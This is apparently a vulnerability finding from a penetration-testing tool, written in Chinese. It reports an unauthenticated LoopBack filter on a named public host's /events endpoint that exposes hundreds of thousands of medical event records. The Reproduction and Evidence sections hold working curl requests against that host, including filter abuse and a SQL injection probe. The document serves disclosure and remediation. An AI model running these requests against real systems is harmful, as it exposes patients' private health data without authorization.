# 4001 /events LoopBack 过滤器无认证可用，可批量拉取 PHI

- ID: `489c1d4e-2d23-4241-9623-140184925eea`
- Severity: **high**
- Status: open
- Type: 未授权访问 / 过滤器滥用
- Target: `https://epcr.tpf.gov.tw:4001/events`
- Conversation: `9f0a20d8-98b0-4f97-8e49-573ac9d822dc`
- Created: 2026-09-01 07:17:20.013047707+08:00

## Description

4001 vitalSignVideoServer 的 /events 接口支持 LoopBack 风格过滤器（如 id[gt]=1、CaseID=$ne、recordUuid=$ne），且无认证即可使用，攻击者可批量拉取 567201 条 PCDT 医疗事件数据（含 CaseID/recordUuid/血压值/时间线等），形成大规模 PHI 泄露。

## Preconditions

公网可达 https://epcr.tpf.gov.tw:4001

## Reproduction

1. curl -sk 'https://epcr.tpf.gov.tw:4001/events?id%5Bgt%5D=1&limit=10'
2. 观察返回 id=2、3 等记录
3. 替换为 CaseID=$ne、recordUuid=$ne 等过滤器
4. 确认无认证即可批量拉取

## Evidence

curl -sk 'https://epcr.tpf.gov.tw:4001/events?id%5Bgt%5D=1&limit=1' 返回 HTTP 200，body 包含 [{"id":2,"CaseID":"180717152801fed7","recordUuid":"Test180805142701",...},...]，说明 id[gt]=1 过滤器生效且无认证；curl -sk 'https://epcr.tpf.gov.tw:4001/events?CaseID=%27%20OR%201%3D1--&limit=1' 返回 []，说明字段被当作精确匹配而非 SQL 注入

## Impact

LoopBack 过滤器无认证可用，攻击者可批量拉取 567201 条 PCDT 医疗事件数据（含 CaseID/recordUuid/血压值/时间线等），形成大规模 PHI 泄露；结合 IDOR（/events/{id} 单条可读），可精准定位特定患者数据；与 Stored XSS 联动，可被利用做跨域数据窃取。

## Recommendation

给 /events 增加 JWT 鉴权与角色控制；限制 LoopBack 过滤器的可用字段（如仅允许 CaseID/recordUuid）；对 id 字段做范围限制（如 id[gt] 最大 10000）；对批量查询做速率限制。
